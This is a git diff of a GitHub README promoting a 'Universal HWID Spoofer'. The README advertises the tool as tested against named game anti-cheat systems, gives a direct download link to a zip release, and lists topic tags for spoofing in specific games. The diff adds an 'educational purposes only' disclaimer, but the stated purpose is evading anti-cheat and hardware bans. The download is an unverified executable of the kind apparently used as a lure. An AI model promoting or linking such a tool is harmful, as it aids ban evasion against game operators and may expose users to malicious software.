@@ -1,28 +1,24 @@
-# UNIVERSAL HWID SPOOFER Evicted
+# 🏆 UNIVERSAL HWID SPOOFER SecHex 🏆
 
-![344](https://github.com/user-attachments/assets/7cacc97d-cda8-401a-8028-98699ded055c)
-![3444](https://github.com/user-attachments/assets/eb04602c-8eba-4f78-88ce-819c3cc92d81)
+![289636344-22ad94a2-f003-49cb-b0ef-fea0160bd093](https://github.com/user-attachments/assets/e4fe0004-78cc-4edb-bb39-c4b09a58897c)
 
 ---
-Tested With:
-⭐Easy Anti-Cheat 
-⭐BattlEye 
-⭐Vanguard 
-⭐PunkBuster
-⭐Ricochet Anti-Cheat 
-⭐FairFight 
-⭐Valve Anti-Cheat 
-⭐XIGNCODE3 
-⭐GameGuard 
-⭐nProtect GameGuard ⭐
+## Tested With:
+
+✅Easy Anti-Cheat 
+✅BattlEye 
+✅Vanguard 
+✅PunkBuster
+✅Ricochet Anti-Cheat 
+✅FairFight 
+✅Valve Anti-Cheat 
+✅XIGNCODE3 
+✅GameGuard 
+✅nProtect GameGuard
 ---
-## Technical Specifications
-- **Supported Operating Systems**:
+- **Operating Systems**:
   - Windows 10 (1903-24H2)
   - Windows 11 (21H2-24H2)
-- **Processor Compatibility**:
-  - Intel
-  - AMD
 ---
 ## How to Use
 1. **Download:** (https://github.com/mebfudYYY/UNIVERSAL-HWID-SPOOFER-EAC-BE-VANGUARD-VAC/releases/download/latest/34_HWIDSpoofer.zip).
@@ -40,6 +36,12 @@ Tested With:
     MAC Spoof: Change your network adapter's MAC address.
 
 ---
-Repository Topics:
+## Repository Topics:
 
 cleaner, disk, driver, easyanticheat, hwid-changer, hwid-spoofer, kdmapper, serial, spoofer, spoofer-apex-legends, spoofer-be, spoofer-eac, spoofer-fivem, spoofer-pubg, spoofer-pubg-mobile, spoofer-rust, spoofer-services, spoofer-valorant, spoofer-valve
+---
+## Disclaimer ⚠️
+
+Please read this disclaimer carefully before using the HWID Spoofing Tool ("Tool") available on this GitHub site. By accessing or using the Tool, you agree to be bound by this disclaimer.
+
+Use at Your Own Risk: The HWID Spoofing Tool is provided for educational and informational purposes only. It is intended to demonstrate the concept of HWID spoofing and its potential applications. However, it is important to understand that the use of this Tool may violate the terms of service or terms of use of certain software or services. Use this Tool at your own risk.
